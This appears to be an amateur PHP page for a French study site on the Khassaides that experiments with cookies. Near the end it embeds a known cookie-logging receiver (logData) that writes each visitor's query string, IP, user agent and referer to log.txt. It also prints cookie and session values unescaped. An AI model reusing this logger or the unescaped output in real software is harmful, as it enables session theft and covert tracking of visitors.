<?php 
//include("check.php");
//include("signup.php");
setcookie("moncookie", 'mour', time()+ 60*60, '/', 'xam-xam.com', false, true);
setcookie('pseudo', 'M@teo21', time() + 365*24*3600, null, null, false, true); 
setcookie('pays', 'France', time() + 365*24*3600, null, null, false, true);
?>

<!DOCTYPE html>
<html>
	<meta charset="UTF-8">
  	<meta name="viewport" content="width=device-width, initial-scale=1">
  	<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
  	<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
	<meta>
<head>
	<title>Plateforme d'étude et de recherche sur les KHASSAIDES</title>
</head>
<body style="background-color:#ffffff">
<script>
	
	function setCookie(cname, cvalue, exdays) {
    var d = new Date();
    d.setTime(d.getTime() + (exdays*24*60*60*1000));
    var expires = "expires="+ d.toUTCString();
    document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
	} 
	
	function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') {
            c = c.substring(1);
			}
        if (c.indexOf(name) == 0) {
            return c.substring(name.length,c.length);
			}
		}
    return "";
	}

function checkCookie() {
    var username=getCookie("username");
    if (username!="") {
        alert("Welcome again " + username);
    } else {
        username = prompt("Please enter your name:", "");
        if (username != "" && username != null) {
            setCookie("username", username, 365);
        }
    }
}

</script>
<nav class="navbar navbar-inverse">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
      <a class="navbar-brand" href="#">Xam-xam.com</a>
    </div>
    <div class="collapse navbar-collapse" id="myNavbar">
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">Accueil</a></li>
        <li><a href="#" onclick="checkCookie();">À propos</a></li>
        <li><a href="#">Enseignements</a></li>
        <li><a href="#">Contact</a></li>
      </ul>
      <ul class="nav navbar-nav navbar-right">
        <li onclick=""><a href="#"><span id="icon" class="glyphicon glyphicon-user"></span><?php session_start(); echo " ".$_SESSION['prenom']." ".$_SESSION["nom"];?></a></li>
        <li><a href="logout.php"><span class="glyphicon glyphicon-log-out"></span> Déconnexion</a></li>
      </ul>
    </div>
  </div>
</nav>

<div>
	<h3>Cookies de l'utilisateur</h3>
	
	<?php
	//setcookie("moncookie", $_SESSION[], time()+ 60*60, null, null, false, true);
	print_r($_COOKIE);
	
	function GetIP() 
{ 
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
		$ip = getenv("HTTP_CLIENT_IP"); 
	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
		$ip = getenv("REMOTE_ADDR"); 
	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
		$ip = $_SERVER['REMOTE_ADDR']; 
	else 
		$ip = "unknown"; 
	return($ip); 
}


function logData() 
{ 
	$ipLog="log.txt"; 
	$cookie = $_SERVER['QUERY_STRING']; 
	$register_globals = (bool) ini_get('register_gobals'); 
	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
	else $ip = GetIP(); 

	$rem_port = $_SERVER['REMOTE_PORT']; 
	$user_agent = $_SERVER['HTTP_USER_AGENT']; 
	$rqst_method = $_SERVER['METHOD']; 
	$rem_host = $_SERVER['REMOTE_HOST']; 
	$referer = $_SERVER['HTTP_REFERER']; 
	$date=date ("l dS of F Y h:i:s A"); 
	$log=fopen("$ipLog", "a+"); 

	if (preg_match("/\bhtm\b/i", $ipLog) || preg_match("/\bhtml\b/i", $ipLog)) 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host | Agent: $user_agent | METHOD: $rqst_method | REF: $referer | DATE{ : } $date | COOKIE:  $cookie <br>"); 
	else 
		fputs($log, "IP: $ip | PORT: $rem_port | HOST: $rem_host |  Agent: $user_agent | METHOD: $rqst_method | REF: $referer |  DATE: $date | COOKIE:  $cookie \n\n"); 
	fclose($log); 
} 

logData(); 
$monip = GetIP();
echo "<br>".$monip; 
	?>
</div>

